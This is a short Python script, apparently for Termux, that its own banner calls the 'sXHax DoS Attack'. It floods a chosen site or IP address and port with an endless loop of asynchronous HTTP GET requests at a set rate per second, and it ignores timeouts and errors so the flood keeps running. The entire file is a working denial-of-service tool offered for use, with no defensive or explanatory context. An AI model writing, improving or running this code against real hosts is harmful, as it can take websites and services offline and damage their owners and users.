import os
import sys
import time
import argparse
import asyncio
import aiohttp

# Limpa a tela do Termux
os.system('clear')

print("sXHax DoS Attack By NullDevz GitHub: https://github.com/NullDevzHax/")

# --- Funcionalidade de Envio de Requests Assíncronas ---

async def send_request(session, url, port):
    """Função assíncrona para enviar uma única requisição."""
    try:
        full_url = f"http://{url}:{port}"
        async with session.get(full_url, timeout=5) as response:
            pass
    except aiohttp.ClientError:
        pass
    except asyncio.TimeoutError:
        pass

async def main():
    """Função principal assíncrona para parsear argumentos e executar o envio."""
    parser = argparse.ArgumentParser(description="Script para enviar requests a um site ou IP usando asyncio.")
    parser.add_argument('-s', '--site', type=str, required=True, help="O endereço do site ou IP.")
    parser.add_argument('-p', '--porta', type=int, default=80, help="A porta (ex: 80).")
    parser.add_argument('-t', '--turbo', type=int, default=1, help="O número de requests por segundo.")

    args = parser.parse_args()

    site = args.site
    port = args.porta
    turbo = args.turbo

    print(f"\nIniciando envio de requests assíncronas...")
    print(f"Site/IP: {site}")
    print(f"Porta: {port}")
    print(f"Turbo (requests/segundo): {turbo}")

    async with aiohttp.ClientSession() as session:
        while True:
            start_time = time.time()

            tasks = [send_request(session, site, port) for _ in range(turbo)]
            await asyncio.gather(*tasks, return_exceptions=True)

            elapsed_time = time.time() - start_time
            time_to_sleep = 1.0 - elapsed_time

            if time_to_sleep > 0:
                await asyncio.sleep(time_to_sleep)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(main())

